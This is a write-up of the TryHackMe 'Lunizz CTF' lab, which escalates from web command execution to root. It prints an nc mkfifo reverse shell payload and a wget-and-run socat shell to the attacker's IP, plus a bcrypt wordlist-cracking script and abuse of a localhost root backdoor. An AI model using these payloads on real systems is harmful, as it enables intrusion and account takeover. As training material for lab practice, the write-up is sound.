# Lunizz CTF

## Introduction

Welcome to my another writeup! In this TryHackMe [Lunizz CTF](https://tryhackme.com/room/lunizzctfnd) room, you'll learn: subdomain enumeration, directory enumeration, WordPress enumeration, SQL injection, Memcached, exploiting relative path, and more! Without further ado, let's dive in.

## Background

> Lunizz CTF

> Difficulty: Medium

- Overall difficulty for me: Medium
   - Initial foothold: Easy
   - Privilege escalation: Medium

# Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lunizz-CTF]
└─# export RHOSTS=10.10.60.160 
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lunizz-CTF]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
3306/tcp open  mysql   syn-ack ttl 63 MySQL 5.7.33-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.33-0ubuntu0.18.04.1
|   Thread ID: 24
|   Capabilities flags: 65535
|   Some Capabilities: ConnectWithDatabase, LongColumnFlag, DontAllowDatabaseTableColumn, LongPassword, SupportsTransactions, Speaks41ProtocolOld, Support41Auth, SupportsCompression, ODBCClient, SwitchToSSLAfterHandshake, InteractiveClient, Speaks41ProtocolNew, FoundRows, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, SupportsLoadDataLocal, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: I\x0Cc"G:IE\x17:z>D\x1Fec\x19+L\x1D
|_  Auth Plugin Name: mysql_native_password
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_5.7.33_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_5.7.33_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-02-11T23:12:30
| Not valid after:  2031-02-09T23:12:30
| MD5:   0b70 1b5f 166e 4269 32e3 01be 40f8 f6e7
| SHA-1: 2866 e1ef d280 9bcf 6cec b15c 27b7 af15 cde1 f92b
| -----BEGIN CERTIFICATE-----
| MIIDBzCCAe+gAwIBAgIBAjANBgkqhkiG9w0BAQsFADA8MTowOAYDVQQDDDFNeVNR
| TF9TZXJ2ZXJfNS43LjMzX0F1dG9fR2VuZXJhdGVkX0NBX0NlcnRpZmljYXRlMB4X
| DTIxMDIxMTIzMTIzMFoXDTMxMDIwOTIzMTIzMFowQDE+MDwGA1UEAww1TXlTUUxf
| U2VydmVyXzUuNy4zM19BdXRvX0dlbmVyYXRlZF9TZXJ2ZXJfQ2VydGlmaWNhdGUw
| ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDRCvq9/K5fEQO0juxe6NG4
| zjV1A5DR/lgWgraEiLmYANxmlN4MY6dy79NnaeCI8fRSjergQIJzFbNWc5mfm6NC
| E3eaLq2X9eN7+KdR2q7VNjJ/fF3D7k4ewa0GnBNGbC2AyoYrFKXxAN6qGU831qU4
| aMNcNCAXcJqqF4rW+3Vjlj8h2/ZkYkRJsVUEz5k6esNYRsVPu7JSFkRLE4lV8Xg9
| vL9arCA9BgR4sE1FqI7mA9DLUcoEZlJXwgl67oad5sxW+GPuZeUF4jF583C8vBhN
| WRtHWPytjQLe69N8BTthbdabtyQI2HMBEGSEDF6U2AJj8OiC3AXUs3L9p//hL/1p
| AgMBAAGjEDAOMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBAHPpnm2k
| 2U9nkklYcE0M2LEWyQE8IJozVMLMZ3KvuTF49+eUGXUeEvoJQnOi6P5ELvc57gGY
| 5QcAdpmqAbdE6vA1jnvK825LCl/L1zpsqXpkj4gu5Znavl2Rs0wXvhGhlj3PlNQu
| SKoSi+s729CulT6OU+JV9NDIOQlzoSfHCHo02t0D006dnx1ko1J/CtWqFi6mPF8u
| jqb87kTDBtMPXEO9OKrWKKjxBBQlVAIgu+VAn3TfeEX5moOZO84Uv7ul6GuJ2Xg3
| J4tSOB1aj0YJcgRXPbYXXf8AgOnMMXv18ZW1x49P5Yro58JyjioZiY7d9bHArRy5
| nuBjGrsuWRNAqBM=
|_-----END CERTIFICATE-----
4444/tcp open  krb524? syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     Can you decode this for me?
|     ZXh0cmVtZWhhcmRyb290cGFzc3dvcmQ=
|     Wrong Password
|   NULL: 
|     Can you decode this for me?
|     ZXh0cmVtZWhhcmRyb290cGFzc3dvcmQ=
|   SSLSessionReq: 
|     Can you decode this for me?
|_    bGV0bWVpbg==
5000/tcp open  upnp?   syn-ack ttl 63
| fingerprint-strings: 
|   FourOhFourRequest, GenericLines, LDAPSearchReq, NULL, RPCCheck: 
|     OpenSSH 5.1
|_    Unable to load config info from /usr/local/ssl/openssl.cnf
```

According to `rustscan` and `nmap` result, we have 4 ports are opened:

Open Ports        | Service
------------------|------------------------
80                | Apache 2.4.29 ((Ubuntu))
3306              | MySQL 5.7.33-0ubuntu0.18.04.1
4444              | Unknown
5000              | OpenSSH 5.1??

## Port 4444

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lunizz-CTF]
└─# nc -nv $RHOSTS 4444
(UNKNOWN) [10.10.60.160] 4444 (?) open
Can you decode this for me?
ZXh0cmVtZXNlY3VyZXJvb3RwYXNzd29yZA==
```

**This looks like a `base64` encoded string. We can decode that via `base64 -d`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lunizz-CTF]
└─# echo "ZXh0cmVtZXNlY3VyZXJvb3RwYXNzd29yZA==" | base64 -d            
extremesecurerootpassword
```

Found the password!

**We can enter the password to login a fake shell?**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lunizz-CTF]
└─# nc -nv $RHOSTS 4444
(UNKNOWN) [10.10.60.160] 4444 (?) open
Can you decode this for me?
ZXh0cmVtZXNlY3VyZXJvb3RwYXNzd29yZA==
extremesecurerootpassword
root@lunizz:# whoami
FATAL ERROR
```

Pretty sure it's a rabbit hole.

## HTTP on Port 80

**Gobuster:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lunizz-CTF]
└─# gobuster dir -u http://$RHOSTS/ -w /usr/share/wordlists/dirb/common.txt -t 100 -x php,html,txt,bak
[...]
/hidden               (Status: 301) [Size: 313] [--> http://10.10.60.160/hidden/]
/index.html           (Status: 200) [Size: 10918]                                
/instructions.txt     (Status: 200) [Size: 339]                                  
/index.html           (Status: 200) [Size: 10918]                                
/server-status        (Status: 403) [Size: 277]                                  
/whatever             (Status: 301) [Size: 315] [--> http://10.10.60.160/whatever/]
```

**`/whatever`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lunizz-CTF/images/a1.png)

**In the `/whatever/index.php`, looks like we can execute commands:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lunizz-CTF/images/a2.png)

But we currently can't do that.

**`/instructions.txt`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lunizz-CTF]
└─# curl http://$RHOSTS/instructions.txt
Made By CTF_SCRIPTS_CAVE (not real)

Thanks for installing our ctf script

#Steps
- Create a mysql user (runcheck:{Redacted})
- Change necessary lines of config.php file

Done you can start using ctf script

#Notes
please do not use default creds (IT'S DANGEROUS) <<<<<<<<<---------------------------- READ THIS LINE PLEASE
```

**Found MySQL credentials!**

## MySQL on Port 3306

**Since we have MySQL credentials, we can remotely login to MySQL on the target machine.**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lunizz-CTF]
└─# mysql -uruncheck -p{Redacted} -h $RHOSTS
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 13
Server version: 5.7.33-0ubuntu0.18.04.1 (Ubuntu)
[...]

MySQL [(none)]> 
```

**Enumerating MySQL:**
```
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| runornot           |
+--------------------+

MySQL [(none)]> use runornot;
[...]

MySQL [runornot]> show tables;
+--------------------+
| Tables_in_runornot |
+--------------------+
| runcheck           |
+--------------------+

MySQL [runornot]> desc runcheck;
+-------+---------+------+-----+---------+-------+
| Field | Type    | Null | Key | Default | Extra |
+-------+---------+------+-----+---------+-------+
| run   | int(11) | YES  |     | NULL    |       |
+-------+---------+------+-----+---------+-------+
```

**Found column `run` in table `runcheck` in database `runornot`.**

# Initial Foothold

```
MySQL [runornot]> SELECT run FROM runcheck;
+------+
| run  |
+------+
|    0 |
+------+
```

The `run` has a `0` value record. What if I change it to `1`?

```
MySQL [runornot]> UPDATE runcheck SET run = 1;
Query OK, 1 row affected (0.218 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MySQL [runornot]> SELECT run FROM runcheck;
+------+
| run  |
+------+
|    1 |
+------+
```

**Now when we check out the `/whatever/index.php`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lunizz-CTF/images/a3.png)

**The `Command Executer Mode` changed to `1`. Let's test for command execution:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lunizz-CTF/images/a4.png)

**We can execute commands! Let's `ping` ourself to make sure it's not a fake command execution:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lunizz-CTF/images/a5.png)

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lunizz-CTF]
└─# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
00:12:27.974610 IP 10.10.60.160 > 10.18.61.134: ICMP echo request, id 3275, seq 1, length 64
00:12:27.974678 IP 10.18.61.134 > 10.10.60.160: ICMP echo reply, id 3275, seq 1, length 64
00:12:28.976203 IP 10.10.60.160 > 10.18.61.134: ICMP echo request, id 3275, seq 2, length 64
00:12:28.976245 IP 10.18.61.134 > 10.10.60.160: ICMP echo reply, id 3275, seq 2, length 64
00:12:29.977006 IP 10.10.60.160 > 10.18.61.134: ICMP echo request, id 3275, seq 3, length 64
00:12:29.977041 IP 10.18.61.134 > 10.10.60.160: ICMP echo reply, id 3275, seq 3, length 64
00:12:30.977705 IP 10.10.60.160 > 10.18.61.134: ICMP echo request, id 3275, seq 4, length 64
00:12:30.977720 IP 10.18.61.134 > 10.10.60.160: ICMP echo reply, id 3275, seq 4, length 64
^C
8 packets captured
8 packets received by filter
0 packets dropped by kernel
```

**Successfully received 4 ICMP reply!**

**To get a reverse shell, I'll:**

- Check `nc` is installed or not:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lunizz-CTF/images/a6.png)

- Setup a `nc` listener:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lunizz-CTF]
└─# nc -lnvp 443       
listening on [any] 443 ...
```

- Run the `nc` reverse shell payload:

**Payload:**
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.18.61.134 443 >/tmp/f
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lunizz-CTF/images/a7.png)

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lunizz-CTF]
└─# nc -lnvp 443       
listening on [any] 443 ...
connect to [10.18.61.134] from (UNKNOWN) [10.10.60.160] 52918
bash: cannot set terminal process group (995): Inappropriate ioctl for device
bash: no job control in this shell
www-data@lunizz:/var/www/html/whatever$ whoami;hostname;id;ip a
whoami;hostname;id;ip a
www-data
lunizz
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:25:e4:9d:4e:89 brd ff:ff:ff:ff:ff:ff
    inet 10.10.60.160/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3370sec preferred_lft 3370sec
    inet6 fe80::25:e4ff:fe9d:4e89/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm `www-data`!

**Stable shell via `socat`:**
```
┌──(root🌸siunam)-[/opt/static-binaries/binaries/linux/x86_64]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

www-data@lunizz:/var/www/html/whatever$ wget http://10.18.61.134/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.18.61.134:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane

┌──(root🌸siunam)-[~/ctf/thm/ctf/Lunizz-CTF]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
2022/09/25 01:30:50 socat[52333] N opening character device "/dev/pts/2" for reading and writing
2022/09/25 01:30:50 socat[52333] N listening on AF=2 0.0.0.0:4444
                                                                 2022/09/25 01:30:53 socat[52333] N accepting connection from AF=2 10.10.60.160:37148 on AF=2 10.18.61.134:4444
                                                                    2022/09/25 01:30:53 socat[52333] N starting data transfer loop with FDs [5,5] and [7,7]
                                                www-data@lunizz:/var/www/html/whatever$ 
www-data@lunizz:/var/www/html/whatever$ stty rows 22 columns 107
www-data@lunizz:/var/www/html/whatever$ export TERM=xterm-256color
www-data@lunizz:/var/www/html/whatever$ ^C
www-data@lunizz:/var/www/html/whatever$ 
```

# Privilege Escalation

## www-data to adam

```
www-data@lunizz:/var/www/html/whatever$ cat /etc/passwd | grep /bin/sh
adam:x:1000:1000::/home/adam:/bin/sh
mason:x:1001:1001::/home/mason:/bin/sh
```

**Found 2 users: `adam` and `mason`.**

**In the root (`/`) of the Linux filesystem, I found a directory called `proct` is owned adam, which is very peculiar:**
```
www-data@lunizz:/var/www/html/whatever$ ls -lah /
[...]
drwxr-xr-x   3 adam adam 4.0K Feb 28  2021 proct
[...]
```

```
www-data@lunizz:/var/www/html/whatever$ ls -lahR /proct
ls -lahR /proct
/proct:
total 12K
drwxr-xr-x  3 adam adam 4.0K Feb 28  2021 .
drwxr-xr-x 25 root root 4.0K Mar 25  2021 ..
drwxr-xr-x  2 adam adam 4.0K Feb 28  2021 pass

/proct/pass:
total 12K
drwxr-xr-x 2 adam adam 4.0K Feb 28  2021 .
drwxr-xr-x 3 adam adam 4.0K Feb 28  2021 ..
-rw-r--r-- 1 adam adam  273 Feb 28  2021 bcrypt_encryption.py
```

**Let's take a look at the `bcrypt_encryption.py` python script!**
```py
import bcrypt
import base64

passw = "wewillROCKYOU".encode('ascii')
b64str = base64.b64encode(passw)
hashAndSalt = bcrypt.hashpw(b64str, bcrypt.gensalt())
print(hashAndSalt)

#hashAndSalt = b'$2b$12${Redacted}'
#bcrypt.checkpw()
```

**Found `adam` password in cleartext! `wewillROCKYOU`**. Let's **Switch User** to `adam`!

```
www-data@lunizz:/var/www/html/whatever$ su adam
Password:

su: Authentication failure
```

But no luck...

**By running `netstat` command to list all listening ports, I found port `8080` in opened on localhost:**
```
www-data@lunizz:/var/www/html/whatever$ netstat -tunlp
[...]
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
[...]
```

**And running command `ps aux`, it's a PHP web server running on port 8080:**
```
www-data@lunizz:/var/www/html/whatever$ ps aux
[...]
root [...] /bin/sh -c php -S 127.0.0.1:8080 -t /root/
```

```
www-data@lunizz:/var/www/html/whatever$ curl http://localhost:8080/    
**********************************************************
*                Mason's Root Backdoor                   *
*                                                        *
*   Please Send Request (with "password" and "cmdtype")  *
*                                                        *
**********************************************************
-------------CMD TYPES-------------
lsla
reboot
passwd
```

It's a root backdoor? Not sure what is it...

Hmm... Let's go back.

**Since we also found a bcrypt hash in `bcrypt_encryption.py`, we can crack it with `john`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lunizz-CTF]
└─# nano adam.hash       
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lunizz-CTF]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt adam.hash
[...]
```

But it couldn't crack the hash...

**Then I guess I'll write a [python script](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lunizz-CTF/crack_bcrypt.py) to crack it, as we know the salt!**

According to [Wikipedia](https://en.wikipedia.org/wiki/Bcrypt) about bcrypt, the hash is:

```
$2<a/b/x/y>$[cost]$[22 character salt][31 character hash]
```

**For example, with input password abc123xyz, cost 12, and a random salt, the output of bcrypt is the string:**
```
$2a$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW
\__/\/ \____________________/\_____________________________/
Alg Cost      Salt                        Hash
```

Armed with this information, we know that adam's bcrypt hash is `$2b$12${Redacted}`!

```py
#!/usr/bin/env python3

import bcrypt
import base64

salt = b'your_bcrypt_salt'
bcrypt_hash = b'complete_bcrypt_hash'

with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as f:
	for word in f.readlines():
		passw = word.strip().encode('ascii', 'ignore')
		b64str = base64.b64encode(passw)
		hashAndSalt = bcrypt.hashpw(b64str, salt)
		print('\r', end='') # Clear previous line
		print(f'[*] Cracking hash: {hashAndSalt}', end='')

		if bcrypt_hash == hashAndSalt:
			print('\n[+] Cracked!')
			print(f'[+] Before hashed: {passw}')
			print(f'[+] After hashed: {hashAndSalt}')
			exit()
```

**Output:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lunizz-CTF]
└─# python3 crack_bcrypt.py
[*] Cracking hash: b'$2b$12${Redacted}'
[+] Cracked!
[+] Before hashed: b'{Redacted}'
[+] After hashed: b'$2b$12${Redacted}'
```

Successfully cracked adam's bcrypt hash!!

**Armed with this password, we can finally Switch User to `adam`!!**
```
www-data@lunizz:/var/www/html/whatever$ su adam
Password: 

$ python3 -c "import pty;pty.spawn('/bin/bash')"
adam@lunizz:/var/www/html/whatever$ whoami;hostname;id;ip a
adam
lunizz
uid=1000(adam) gid=1000(adam) groups=1000(adam)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:25:e4:9d:4e:89 brd ff:ff:ff:ff:ff:ff
    inet 10.10.60.160/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3528sec preferred_lft 3528sec
    inet6 fe80::25:e4ff:fe9d:4e89/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm `adam`!

## adam to mason

**In the `Desktop` directory of `adam`'s home directory, there is a weird txt file:**
```
adam@lunizz:~/Desktop/.archive$ cat to_my_best_friend_adam.txt 
do you remember our place 
i love there it's soo calming
i will make that lights my password

--

https://www.google.com/maps/@{Redacted}
```

**This google map link brings me to a place:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lunizz-CTF/images/a8.png)

**And the place name is the `mason`'s password!**

Let's **Switch User** to `mason`! (All small captial letters and no space.)

```
adam@lunizz:~/Desktop/.archive$ su mason
Password: 

$ python3 -c "import pty;pty.spawn('/bin/bash')"
mason@lunizz:/home/adam/Desktop/.archive$ whoami;hostname;id;ip a
mason
lunizz
uid=1001(mason) gid=1001(mason) groups=1001(mason)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:25:e4:9d:4e:89 brd ff:ff:ff:ff:ff:ff
    inet 10.10.60.160/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2971sec preferred_lft 2971sec
    inet6 fe80::25:e4ff:fe9d:4e89/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm `mason`!

**user.txt:**
```
mason@lunizz:~$ cat /home/mason/user.txt 
thm{Recated}
```

## mason to root

**Did you still remember the port 8080 in localhost?**
```
mason@lunizz:~$ curl http://localhost:8080/
**********************************************************
*                Mason's Root Backdoor                   *
*                                                        *
*   Please Send Request (with "password" and "cmdtype")  *
*                                                        *
**********************************************************
-------------CMD TYPES-------------
lsla
reboot
passwd
```

Since now we now `mason` password, we may interact with this backdoor, as it needs a password.

**Also, we don't know it needs a GET request or a POST request. Let's try GET request first:**
```
mason@lunizz:~$ curl 'http://localhost:8080?password={Redacted}&cmdtype=lsla'
**********************************************************
*                Mason's Root Backdoor                   *
*                                                        *
*   Please Send Request (with "password" and "cmdtype")  *
*                                                        *
**********************************************************
-------------CMD TYPES-------------
lsla
reboot
passwd
```

**Nope. Maybe POST request?**
```
mason@lunizz:~$ curl 'http://localhost:8080' -X POST -d 'password={Redacted}&cmdtype=lsla'
total 44
drwx------  6 root root 4096 Feb 28  2021 .
drwxr-xr-x 25 root root 4096 Mar 25  2021 ..
lrwxrwxrwx  1 root root    9 Feb 10  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3771 Feb 10  2021 .bashrc
drwx------  3 root root 4096 Feb 12  2021 .cache
drwx------  3 root root 4096 Feb 12  2021 .gnupg
-rw-r--r--  1 root root 1044 Feb 28  2021 index.php
drwxr-xr-x  3 root root 4096 Feb  9  2021 .local
lrwxrwxrwx  1 root root    9 Feb 11  2021 .mysql_history -> /dev/null
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r-----  1 root root   38 Feb 28  2021 r00t.txt
-rw-r--r--  1 root root   66 Feb 28  2021 .selected_editor
drwx------  2 root root 4096 Feb  9  2021 .ssh
**********************************************************
*                Mason's Root Backdoor                   *
*                                                        *
*   Please Send Request (with "password" and "cmdtype")  *
*                                                        *
**********************************************************
-------------CMD TYPES-------------
lsla
reboot
passwd
```

Yes!! The POST request works!

**Hmm... What if I use the `passwd` command type?**
```
mason@lunizz:~$ curl 'http://localhost:8080' -X POST -d 'password={Redacted}&cmdtype=passwd'
<br>Password Changed To :{Redacted}<br>**********************************************************
*                Mason's Root Backdoor                   *
*                                                        *
*   Please Send Request (with "password" and "cmdtype")  *
*                                                        *
**********************************************************
-------------CMD TYPES-------------
lsla
reboot
passwd
```

Changed password for user root?

Let's **Switch User** to `root`:

```
mason@lunizz:~$ su root
Password: 
root@lunizz:/home/mason# whoami;hostname;id;ip a
root
lunizz
uid=0(root) gid=0(root) groups=0(root)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:25:e4:9d:4e:89 brd ff:ff:ff:ff:ff:ff
    inet 10.10.60.160/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2294sec preferred_lft 2294sec
    inet6 fe80::25:e4ff:fe9d:4e89/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

# Rooted

**root.txt:**
```
root@lunizz:/home/mason# cat /root/r00t.txt 
thm{Redacted}
```

# Conclusion

What we've learned:

1. Directory Enumeration
2. MySQL Enumeration
3. Cracking Bcrypt Hash With Known Salt via Custom Python Script
4. Privilege Escalation via PHP Backdoor in Localhost